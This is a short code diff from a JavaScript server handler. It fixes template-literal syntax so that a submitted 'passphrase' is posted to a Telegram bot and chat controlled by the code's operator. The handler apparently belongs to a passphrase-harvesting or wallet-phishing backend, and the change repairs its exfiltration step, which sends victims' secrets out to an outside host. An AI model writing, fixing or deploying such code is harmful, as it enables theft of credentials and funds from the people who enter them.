@@ -29,9 +29,9 @@ module.exports = async (req, res) => {
             console.log("Encrypted passphrase:", encryptedPassphrase); // Log the encrypted passphrase
 
             // Send to your Telegram account
-            const telegramResponse = await axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
+            const telegramResponse = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 chat_id: YOUR_CHAT_ID,
-                text: Encrypted Passphrase: ${encryptedPassphrase},
+                text: `Encrypted Passphrase: ${encryptedPassphrase}`,
             });
             console.log("Telegram response:", telegramResponse.data); // Log the Telegram response
 
